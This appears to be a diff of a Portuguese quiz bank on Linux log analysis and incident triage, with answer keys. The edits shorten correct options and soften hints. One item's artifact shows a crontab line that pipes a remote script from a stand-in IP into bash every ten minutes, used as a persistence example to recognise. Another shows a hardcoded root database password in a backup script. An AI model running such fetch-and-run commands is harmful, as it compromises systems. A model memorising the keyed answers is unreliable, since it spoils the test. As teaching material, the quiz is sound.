@@ -247,14 +247,14 @@
       "trecho": "# objetivo: listar os IPs que mais tentaram autenticar sem sucesso\ngrep \"Failed password\" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn\n\n# saída obtida em uma amostra de 4 linhas:\n#      1 203.0.113.45\n#      1 198.51.100.7\n#      1 oracle\n#      1 admin",
       "enunciado": "A cadeia está sintaticamente correta, mas o resultado mistura nomes de usuário com endereços. Qual é a causa?",
       "alternativas": [
-        "As linhas com \"invalid user\" têm duas palavras a mais, então o campo 11 aponta para posições diferentes conforme a linha",
+        "As linhas com \"invalid user\" têm duas palavras a mais",
         "O awk não consegue processar endereços IP, apenas texto sem pontos",
         "O uniq -c está contando errado porque as linhas não foram ordenadas antes",
         "O grep está filtrando linhas demais e trazendo eventos que não são de falha de senha"
       ],
       "correta": 0,
       "dicas": [
-        "Compare palavra a palavra uma linha com \"invalid user\" e outra sem.",
+        "Compare palavra a palavra uma linha de cada tipo do log.",
         "Posição fixa de campo pressupõe formato idêntico em todas as linhas.",
         "Contar a partir do fim da linha seria mais estável que contar do começo."
       ],
@@ -283,7 +283,7 @@
       ],
       "enunciado": "O que faz o comando `cut -d: -f1 /etc/passwd`?",
       "alternativas": [
-        "Exibe o primeiro campo de cada linha, usando dois-pontos como delimitador — ou seja, os nomes das contas",
+        "Exibe o primeiro campo de cada linha, usando dois-pontos como delimitador",
         "Remove o primeiro campo de cada linha e exibe o restante",
         "Exibe apenas a primeira linha do arquivo",
         "Divide o arquivo em partes de um campo cada e grava em arquivos separados"
@@ -458,7 +458,7 @@
       "artefato": "# crontab -l  (usuário www-data)\n*/10 * * * * /usr/bin/curl -s http://198.51.100.23/x.sh | /bin/bash\n0 3 * * 0 /usr/local/bin/rotate-logs",
       "enunciado": "Qual é a leitura correta destas duas entradas de cron?",
       "alternativas": [
-        "A primeira baixa e executa um script remoto a cada 10 minutos sob o usuário do servidor web — persistência típica de comprometimento; a segunda é uma rotina semanal legítima",
+        "A primeira baixa e executa script remoto a cada 10 minutos; a segunda é legítima",
         "As duas são rotinas de manutenção normais, com frequências diferentes",
         "A primeira roda uma vez por dia às 10h; a segunda roda todo dia às 3h",
         "A segunda é a suspeita, porque rodar de madrugada indica tentativa de passar despercebido"
@@ -682,7 +682,7 @@
       "trecho": "#!/bin/bash\n# backup diário do banco\nDESTINO=/backup/db.sql\nmysqldump -u root -pSenha123 aplicacao > $DESTINO\necho \"backup concluído\" >> /var/log/backup.log",
       "enunciado": "Além da senha em texto claro na linha de comando, qual falha deste script tem maior chance de causar perda de dados?",
       "alternativas": [
-        "O destino é sempre o mesmo arquivo e a saída de erro não é capturada: uma falha do mysqldump sobrescreve o backup anterior com um arquivo vazio, e o log registra sucesso mesmo assim",
+        "O destino é sempre o mesmo arquivo, e o erro não é capturado",
         "A variável DESTINO deveria estar entre aspas duplas para funcionar",
         "O script não define permissões no arquivo de backup",
         "O uso de >> no log fará o arquivo crescer indefinidamente"
@@ -754,7 +754,7 @@
       ],
       "enunciado": "Por que passar uma senha como argumento na linha de comando é considerado inseguro?",
       "alternativas": [
-        "O argumento fica visível na lista de processos para outros usuários da máquina e costuma ir para o histórico do shell",
+        "O argumento fica visível na lista de processos para outros usuários",
         "O shell transmite argumentos sem cifra pela rede antes de executá-los",
         "Senhas em argumento são automaticamente registradas pelo sistema em /etc/shadow",
         "O sistema converte argumentos para maiúsculas, alterando a senha"
@@ -825,7 +825,7 @@
       ],
       "enunciado": "Você suspeita que um invasor deixou arquivos em um servidor há três dias. Qual busca ajuda mais na triagem?",
       "alternativas": [
-        "Listar arquivos modificados nos últimos três dias em diretórios graváveis, como /tmp, /var/tmp e /dev/shm",
+        "Listar arquivos modificados nos últimos dias em diretórios graváveis",
         "Listar todos os arquivos do sistema ordenados por tamanho",
         "Procurar arquivos com extensão .exe em todo o sistema",
         "Listar os arquivos com data de criação anterior à instalação do sistema"
@@ -895,7 +895,7 @@
       ],
       "enunciado": "Uma equipe quer detectar rapidamente a criação de tarefas agendadas não autorizadas em servidores. Qual medida é a mais eficaz?",
       "alternativas": [
-        "Monitorar alterações nos arquivos e diretórios de cron e nos timers do systemd, com alerta para toda mudança",
+        "Monitorar alterações nos arquivos de cron e nos timers do systemd",
         "Revisar manualmente as tarefas agendadas a cada seis meses",
         "Bloquear o uso do comando crontab para todos os usuários do sistema",
         "Aumentar o nível de detalhe dos registros do servidor web"
@@ -1076,7 +1076,7 @@
       ],
       "enunciado": "Um script de manutenção roda por cron e apaga arquivos antigos. Ele funciona quando executado à mão, mas falha quando agendado. Qual é a causa mais provável?",
       "alternativas": [
-        "O ambiente do cron é reduzido: variáveis como PATH podem não estar definidas, e comandos chamados sem caminho absoluto não são encontrados",
+        "O ambiente do cron é reduzido, e o PATH pode faltar",
         "O cron não permite a execução de comandos que apagam arquivos",
         "O script precisa de permissão 777 para ser executado pelo cron",
         "O cron só executa scripts escritos em Python"
@@ -1147,14 +1147,14 @@
       ],
       "enunciado": "Uma equipe quer garantir que a análise de logs continue possível mesmo quando o volume cresce muito. Qual prática ajuda mais?",
       "alternativas": [
-        "Padronizar o formato dos registros, com campos em posição previsível ou estruturados, para que a extração não dependa de contar palavras",
+        "Padronizar o registro, com campos sempre no mesmo lugar",
         "Reduzir o nível de detalhe dos registros para diminuir o volume",
         "Compactar os logs diariamente para economizar espaço em disco",
         "Manter os logs apenas nos servidores de origem, evitando duplicação"
       ],
       "correta": 0,
       "dicas": [
-        "Lembre do problema do campo de posição fixa quando o formato varia.",
+        "Lembre do problema que a questão 6 deste módulo descreve, e do que o teria evitado.",
         "Reduzir detalhe resolve volume, mas perde o quê?",
         "Compactar ajuda em disco; ajuda em análise?"
       ],
@@ -1265,7 +1265,7 @@
       ],
       "enunciado": "Você recebeu 4 GB de logs de um servidor comprometido e tem uma janela suspeita de duas horas. Como reduzir isso a algo analisável?",
       "alternativas": [
-        "Recortar primeiro pela janela de tempo, depois filtrar por indicadores conhecidos, e só então extrair e contar campos",
+        "Recortar pela janela de tempo, depois filtrar por indicadores conhecidos",
         "Abrir os arquivos em um editor de texto e ler sequencialmente do início",
         "Extrair todos os campos de todas as linhas e depois procurar padrões na saída",
         "Compactar os arquivos e analisar apenas o que couber na memória disponível"
@@ -1303,7 +1303,7 @@
       ],
       "enunciado": "Você precisa escrever um script que roda diariamente e alerta quando um endereço acumula mais de 50 falhas de autenticação em um dia. Quais cuidados de projeto são os mais importantes?",
       "alternativas": [
-        "Ancorar a extração de campos de forma resistente a variações de formato, registrar saída e erro em log, usar caminhos absolutos por causa do cron, e verificar o código de retorno antes de declarar sucesso",
+        "Ancorar a extração, registrar erro e usar caminho absoluto",
         "Rodar o script como root para garantir acesso a todos os arquivos de log",
         "Manter o script curto, em uma única linha, para facilitar a manutenção",
         "Descartar a saída de erro com 2>/dev/null, para que o log fique limpo"
